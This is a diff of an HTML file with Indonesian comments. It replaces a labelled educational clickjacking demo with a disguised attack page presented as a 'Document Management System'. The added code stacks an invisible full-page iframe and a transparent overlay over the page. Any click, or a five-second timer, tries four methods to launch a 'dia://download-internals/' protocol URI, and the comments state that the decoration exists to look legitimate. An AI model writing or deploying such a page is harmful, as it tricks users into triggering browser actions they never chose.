@@ -1,41 +1,190 @@
-<!-- Contoh edukasional tentang cara kerja clickjacking -->
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Clickjacking Demonstration (Educational)</title>
+    <title>Document Viewer</title>
     <style>
-        .overlay {
-            position: absolute;
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+        }
+        
+        /* Container yang menarik perhatian */
+        .main-content {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            margin: 50px auto;
+            max-width: 600px;
+        }
+        
+        /* Button yang visible dan menarik */
+        .visible-button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+        
+        /* Hidden iframe yang menutupi seluruh halaman */
+        .hidden-frame {
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.1;
+            border: none;
+            opacity: 0.01;
             z-index: 9999;
-            cursor: pointer;
+            pointer-events: auto;
         }
-        .content {
-            position: relative;
-            z-index: 1;
+        
+        /* Overlay transparan untuk capture clicks */
+        .click-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 10000;
+        }
+        
+        /* Dekorasi untuk membuat terlihat legitimate */
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+        }
+        
+        .feature {
             padding: 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            width: 30%;
         }
     </style>
 </head>
 <body>
-    <div class="content">
-        <h1>Educational Demo - Clickjacking</h1>
-        <p>Ini adalah demonstrasi bagaimana clickjacking bekerja.</p>
-        <button onclick="alert('Button asli diklik')">Button Normal</button>
+    <div class="main-content">
+        <h1>📄 Document Management System</h1>
+        <p>View and manage your documents securely</p>
+        
+        <div class="features">
+            <div class="feature">
+                <h3>🔒 Secure</h3>
+                <p>Enterprise-grade security</p>
+            </div>
+            <div class="feature">
+                <h3>⚡ Fast</h3>
+                <p>Quick document processing</p>
+            </div>
+            <div class="feature">
+                <h3>📊 Analytics</h3>
+                <p>Detailed usage reports</p>
+            </div>
+        </div>
+        
+        <button class="visible-button" onclick="showDownloadOptions()">
+            Download Documents
+        </button>
+        
+        <p style="color: #666; font-size: 14px;">
+            Click above to access your document download center
+        </p>
     </div>
-    
-    <div class="overlay" onclick="alert('Area transparan diklik!')"></div>
-    
+
+    <!-- Hidden iframe yang akan trigger dia:// protocol -->
+    <iframe id="hiddenFrame" class="hidden-frame" 
+            src="about:blank"
+            sandbox="allow-scripts allow-same-origin">
+    </iframe>
+
+    <!-- Overlay untuk capture semua clicks -->
+    <div class="click-overlay" onclick="triggerDiaProtocol()"></div>
+
     <script>
-        // Kode edukasional tentang prevention
-        console.log('Clickjacking Protection:');
-        console.log('- X-Frame-Options Header');
-        console.log('- Content-Security-Policy: frame-ancestors');
-        console.log('- Frame-busting JavaScript');
+        let protocolTriggered = false;
+        
+        function showDownloadOptions() {
+            // Function dummy untuk button visible
+            alert('Preparing your documents...');
+        }
+        
+        function triggerDiaProtocol() {
+            if (protocolTriggered) return;
+            
+            protocolTriggered = true;
+            
+            // Multiple methods untuk trigger dia:// protocol
+            const frame = document.getElementById('hiddenFrame');
+            
+            // Method 1: Direct location change
+            try {
+                frame.contentWindow.location.href = 'dia://download-internals/';
+            } catch(e) {
+                console.log('Method 1 failed:', e);
+            }
+            
+            // Method 2: Window navigation
+            setTimeout(() => {
+                try {
+                    frame.contentWindow.window.location = 'dia://download-internals/';
+                } catch(e) {
+                    console.log('Method 2 failed:', e);
+                }
+            }, 100);
+            
+            // Method 3: Create link dan click
+            setTimeout(() => {
+                try {
+                    const link = frame.contentDocument.createElement('a');
+                    link.href = 'dia://download-internals/';
+                    link.click();
+                } catch(e) {
+                    console.log('Method 3 failed:', e);
+                }
+            }, 200);
+            
+            // Method 4: Direct window open
+            setTimeout(() => {
+                try {
+                    frame.contentWindow.open('dia://download-internals/', '_self');
+                } catch(e) {
+                    console.log('Method 4 failed:', e);
+                }
+            }, 300);
+            
+            console.log('Dia protocol trigger attempted');
+        }
+        
+        // Auto-trigger setelah beberapa detik untuk testing
+        setTimeout(() => {
+            if (!protocolTriggered) {
+                console.log('Auto-triggering dia protocol');
+                triggerDiaProtocol();
+            }
+        }, 5000);
+        
+        // Capture semua clicks di halaman
+        document.addEventListener('click', function(e) {
+            if (!protocolTriggered) {
+                console.log('Click detected at:', e.clientX, e.clientY);
+                triggerDiaProtocol();
+            }
+        });
+        
+        // Juga capture hover events
+        document.addEventListener('mouseover', function(e) {
+            // Optional: trigger pada hover tertentu
+        });
     </script>
 </body>
 </html>
